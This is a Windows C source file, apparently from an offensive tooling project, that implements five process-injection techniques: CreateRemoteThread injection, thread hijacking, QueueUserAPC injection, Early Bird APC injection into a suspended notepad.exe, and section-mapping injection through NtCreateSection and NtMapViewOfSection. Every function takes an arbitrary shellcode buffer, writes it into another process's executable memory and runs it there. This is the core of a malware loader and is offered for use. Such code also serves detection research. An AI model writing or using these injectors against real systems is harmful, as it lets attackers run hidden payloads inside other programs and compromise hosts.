#include "Techniques.h"
#include "macros.h"
#include "structs.h"


void ProcessInjection(int PID,BYTE* shellcode,size_t size)
{
	HANDLE hProcess =  OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID);
	if (!hProcess)
	{
		error("Failed To Get Handle To Process Error (%d)", GetLastError());
	}
	BYTE* raddr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (raddr == NULL)
	{
		error("Failed To Allocate Space For The Shellcode Error (%d)", GetLastError());
	}
	okay("Allocated Space At 0x%p", raddr);

	if (!WriteProcessMemory(hProcess, raddr, shellcode, size, NULL))
	{
		error("Failed To Write shellcode into target process");        
	}
	getchar();
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)raddr, NULL, 0, NULL);

	if (!hThread)
	{
		error("Failed To Create Remote Thread Error		(%d)",GetLastError());
	}
	WaitForSingleObject(hThread, INFINITE);
	okay("Injection Completed");
	CloseHandle(hProcess);
	CloseHandle(hThread);
}


void ThreadHijacking(DWORD PID,DWORD TID,BYTE* shellcode,size_t size)
{
	
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess)
	{
		error("Failed To Get Handle To Process Error (%d)", GetLastError());
	}
	BYTE* raddr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (raddr == NULL)
	{
		error("Failed To Allocate Space For The Shellcode Error (%d)", GetLastError());
	}


	if (!WriteProcessMemory(hProcess, raddr, shellcode, size, NULL))
	{
		error("Failed To Write shellcode into target process");
	}
	HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, TID);
	if (!hThread)
	{
		error("Failed To Open Thread");
	}
	if (SuspendThread(hThread) == (DWORD)-1)
	{
		error("Failed To Suspend Thread (%d)",GetLastError());
	}
	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(CONTEXT));
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &ctx))
	{
		error("Failed To Get Thread Context For the current process");
		ResumeThread(hThread);

	}
	ctx.Rip = (DWORD64)raddr;
	if (!SetThreadContext(hThread, &ctx))
	{
		error("Failed To Set Thread Context (%d)",GetLastError());
		ResumeThread(hThread);
	}
	if (ResumeThread(hThread) == (DWORD)-1)
	{
		error("Failed To Resume Thread (%d)",GetLastError());
	}
	okay("Injection Completed");
}


int QueueUserAPCInjection(DWORD PID, DWORD TID, BYTE* shellcode, size_t size)
{
	 
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess)
	{
		error("Failed To Get Handle To Process Error (%d)", GetLastError());
		return -1;
	}
	BYTE* raddr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (raddr == NULL)
	{
		error("Failed To Allocate Space For The Shellcode Error (%d)", GetLastError());
		return -1;
	}


	if (!WriteProcessMemory(hProcess, raddr, shellcode, size, NULL))
	{
		error("Failed To Write shellcode into target process");
		return -1;
	}
	HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, TID);
	QueueUserAPC((PAPCFUNC)raddr, hThread, NULL);
	okay("Injection Completed");
	return 0;
}


int EarlyBird( BYTE* shellcode, size_t size)
{
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	const char* path = "C:\\Windows\\System32\\notepad.exe"; //change to anything u want
	BOOL success = CreateProcessA(path,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi);
	BYTE* raddr = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (raddr == NULL)
	{
		error("Failed To Allocate Space For The Shellcode Error (%d)", GetLastError());
		return -1;
	}


	if (!WriteProcessMemory(pi.hProcess, raddr, shellcode, size, NULL))
	{
		error("Failed To Write shellcode into target process");
		return -1;
	}
	QueueUserAPC((PAPCFUNC)raddr, pi.hThread, NULL);
	ResumeThread(pi.hThread);
	okay("Thread Resumed !");
	okay("Injection Completed");
	return 0;

}


int  MapViewOfSectionInjection(DWORD PID, BYTE* shellcode, size_t size)
{
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	NtmapViewOfSection_t NtmapViewOfSection = NULL;
	NtCreateSection_t NtCreateSection = NULL;

	PVOID localBase = NULL;
	HANDLE hSection = NULL;
	
	NtmapViewOfSection = (NtmapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
	NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
	
	NTSTATUS status2 = NtCreateSection(&hSection,SECTION_ALL_ACCESS,NULL,&size,PAGE_EXECUTE_READWRITE,SEC_COMMIT,NULL);
	if (!hSection || status2 != 0)
	{
		error("Failed To Create Section");
		return -1;
	}
	
	NTSTATUS status1 = NtmapViewOfSection(hSection,GetCurrentProcess(),&localBase,0,0,NULL,&size ,ViewUnmap,0,PAGE_READWRITE);
	if (status1 != 0) {
		error("NtMapViewOfSection failed: 0x%X", status1);
	}
	memcpy(localBase, shellcode, size);
	PVOID remoteBase = NULL;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess)
	{
		error("failed to get handle to the target process (%d)",GetLastError());
		return GetLastError();
	}
	NTSTATUS status = NtmapViewOfSection(hSection,hProcess,&remoteBase,0,0,NULL,&size,ViewUnmap,0,PAGE_EXECUTE_READ);
	if (status != 0)
	{
		error("Failed To map section into remote process");
		return GetLastError();
	}
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBase, NULL, 0, NULL);
	if (!hThread)
	{
		error("Failed To Create Remote Thread (%d)",GetLastError());
		return GetLastError();
	}
	WaitForSingleObject(hThread,INFINITE);
	okay("Thread Created !");

	CloseHandle(hSection);
	CloseHandle(hThread);
	
}



